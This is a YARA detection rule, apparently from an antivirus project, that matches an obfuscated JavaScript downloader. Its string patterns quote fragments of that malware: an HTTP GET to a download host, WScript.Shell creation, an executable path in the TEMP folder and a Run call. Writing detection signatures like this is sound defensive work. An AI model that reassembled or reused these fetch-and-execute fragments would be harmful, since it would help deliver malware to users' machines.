rule sig_20160401_0b3966099d36b691beba487d2f3c01ee {
  meta:
    description = "datamaliciousorder - file 20160401_0b3966099d36b691beba487d2f3c01ee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "225b5abad160126e8df693f4631604c2daa61aaaff40e9f8a00b3576fe335fdd"

  strings:
    $s1  = "DgPgq[YshNr](\"G\" + \"ET\", \"http://hotlinehomeappalinces.com/l2osa\", false);" fullword ascii
    $s2  = "var TgePh = function XdfJe() {return WScript[AyRpy](\"WScript\"+\".Shell\");}(), QtwAyw = 11;" fullword ascii
    $s3  = "function GjRz(TgRr, ZqiGoq){GpJov = GpJov * 1; return TgRr - ZqiGoq;};" fullword ascii
    $s4  = "if (DgPgq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function StBi() {return TgePh[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"r33jt19TU2OsZc.ex\" + \"e\";};" fullword ascii
    $s6  = "function MrYk(){return KoSz + \"\";};" fullword ascii
    $s7  = "function LlJtb() {return ((HsWq == true) && (HsWq == UdmHdz)) ? 1 : GpJov;};" fullword ascii
    $s8  = "function HaDt(){return 23;};" fullword ascii
    $s9  = "var QnwDg = false;" fullword ascii
    $s10 = "function QrVe(BsFo) {var NeEjv = (1, 2, 3, 4, 5, BsFo); return NeEjv;};" fullword ascii
    $s11 = "function TnjFla()" fullword ascii
    $s12 = "var UdmHdz = false;" fullword ascii
    $s13 = "}while (PfBma);" fullword ascii
    $s14 = "UdmHdz = true; " fullword ascii
    $s15 = "var PxwQy = new this[\"Date\"]();" fullword ascii
    $s16 = "var HsWq = false;" fullword ascii
    $s17 = "HsWq = true; " fullword ascii
    $s18 = "function NczKv(){return AyRpy;};" fullword ascii
    $s19 = "return GjRz(TcRej, XnSdn);" fullword ascii
    $s20 = "function CuVty(SwnVls){TgePh[\"R\"+\"un\"](SwnVls, GpJov, GpJov);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}